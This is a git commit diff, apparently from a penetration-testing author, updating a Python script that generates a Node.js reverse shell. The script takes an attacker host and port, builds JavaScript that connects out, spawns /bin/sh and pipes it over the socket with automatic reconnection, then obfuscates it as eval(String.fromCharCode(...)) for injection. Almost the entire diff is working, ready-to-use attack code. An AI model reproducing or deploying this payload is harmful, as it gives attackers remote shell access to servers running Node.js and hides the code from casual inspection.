e476ed726be25c30da47922c7bc42c829105b988
Ajin Abraham <ajin25@gmail.com>
2017-02-08 21:23:10 +0530

    update nodejs_reshell

--- nodejsshell.py
+++ nodejsshell.py
@@ -7,24 +7,47 @@
 import sys
 
 if len(sys.argv) != 3:
-    print "Usage: %s <LHOST> <LPORT>" %(sys.argv[0])
+    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
     sys.exit(0)
 
-ip = sys.argv[1]
-port = sys.argv[2]
+IP_ADDR = sys.argv[1]
+PORT = sys.argv[2]
+
 
 def charencode(string):
-    encoded=''
+    """String.CharCode"""
+    encoded = ''
     for char in string:
-        encoded=encoded+","+str(ord(char))
+        encoded = encoded + "," + str(ord(char))
     return encoded[1:]
 
-print "[+] LHOST = %s" %(ip)
-print "[+] LPORT = %s" %(port)
-plaintext = """var net = require('net'),util = require('util'),spawn = require('child_process').spawn,sh = spawn('/bin/sh',[]);HOST="XXLHOSTXX";PORT="XXLPORTXX";TIMEOUT="5000";function c(HOST,PORT) {    var client = new net.Socket();    client.connect(PORT, HOST, function() {        client.write("Connected");        client.pipe(sh.stdin);        util.pump(sh.stdout,client);    });    client.on('error', function(e) {        setTimeout(c(HOST,PORT), TIMEOUT);    });} c(HOST,PORT);"""
-plaintext = plaintext.replace('XXLHOSTXX', ip)
-plaintext = plaintext.replace('XXLPORTXX', port)
+print "[+] LHOST = %s" % (IP_ADDR)
+print "[+] LPORT = %s" % (PORT)
+NODEJS_REV_SHELL = '''
+var net = require('net');
+var spawn = require('child_process').spawn;
+HOST="%s";
+PORT="%s";
+TIMEOUT="5000";
+if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
+function c(HOST,PORT) {
+    var client = new net.Socket();
+    client.connect(PORT, HOST, function() {
+        var sh = spawn('/bin/sh',[]);
+        client.write("Connected!\\n");
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+        sh.on('exit',function(code,signal){
+          client.end("Disconnected!\\n");
+        });
+    });
+    client.on('error', function(e) {
+        setTimeout(c(HOST,PORT), TIMEOUT);
+    });
+}
+c(HOST,PORT);
+''' % (IP_ADDR, PORT)
 print "[+] Encoding"
-payload = charencode(plaintext)
-final = "eval(String.fromCharCode(%s))" %(payload)
-print final
+PAYLOAD = charencode(NODEJS_REV_SHELL)
+print "eval(String.fromCharCode(%s))" % (PAYLOAD)
